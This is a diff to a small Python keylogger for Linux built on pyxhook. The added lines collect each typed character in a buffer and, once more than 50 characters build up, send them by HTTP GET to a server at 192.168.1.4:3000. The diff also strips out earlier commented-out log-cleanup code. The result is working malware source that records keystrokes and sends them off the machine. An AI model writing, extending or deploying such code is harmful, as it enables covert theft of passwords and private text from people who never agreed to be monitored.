@@ -2,6 +2,8 @@
 # to be used in linux 
 import os 
 import pyxhook 
+import requests
+
 
 global_string = ''
 
@@ -30,6 +32,7 @@ if os.environ.get('pylogger_clean', None) is not None:
 
 #creating key pressing event and saving it into log file shtssthsnthstn
 def OnKeyPress(event): 
+	global global_string
 	bad_chars = ['Up','Down','Left','Right', "Shift_L", "Shift_R", "Alt_L","Alt_R",	"Control_L","Control_R"]
 	with open(log_file, 'a+') as f:
 		print(event)
@@ -37,13 +40,14 @@ def OnKeyPress(event):
 		print(chr(event.Ascii))
 		if event.Key not in bad_chars:
 			f.write('{}'.format(chr(event.Ascii)))
-			#global_string = global_string + chr(event.Ascii)
-			#if len(global_string > 50):
+			global_string = global_string + chr(event.Ascii)
+			print(len(global_string))
+			print(global_string)
+			if len(global_string)>50:
+				send_keys(global_string)
+				global_string=""
 			#	f.write(str(global_string))
 				
-			
-
-
 # create a hook manager object 
 new_hook = pyxhook.HookManager() 
 new_hook.KeyDown = OnKeyPress 
@@ -62,48 +66,12 @@ except Exception as ex:
 		f.write('\n{}'.format(msg)) 
 
 
-file_in = "/home/pi/Desktop/file.log"
-file_out = "/home/pi/Desktop/filenew.log"
-
-with open(file_in, "rt") as fin:
-	with open(file_in, "wt") as fout:
-		for line in fin:
-			fout.write(line.replace("Shift_Lplus", "+"))
-			
-
-		
-
-'''
-
-s = open("/home/pi/Desktop/file.log").read()
-s = s.replace("Shift_Lplus", "+")
-f = open("/home/pi/Desktop/file.log", 'w')
-f.write(s)
-f.close()
-'''
-
-
-
-'''
-sdatei = open('/home/pi/Desktop/file.log','rt')
-data = sdatei.read()
-data = data.replace("Shift_Lplus", "+")
-sdatei.close()
-
-sdatei = open('/home/pi/Desktop/file.log','wt')
-sdatei.write(data)
-sdatei.close()
-'''
-
-
-#txt = print(sdatei.readlines())
-#x = txt.replace("Shift_Lplus", "+")
-#print(x)
-
-#sdatei.write	
-#sdatei.close()
-
-#Shift_Lplus
+def send_keys(a_string):
+	#keys_logged = readfile("/home/pi/Desktop/file.log")
+	URL="192.168.1.4"
+	print(a_string)
+	requests.get("http://"+ URL +":3000/in_string", params = {"key_info":a_string})
+	
 
 
 
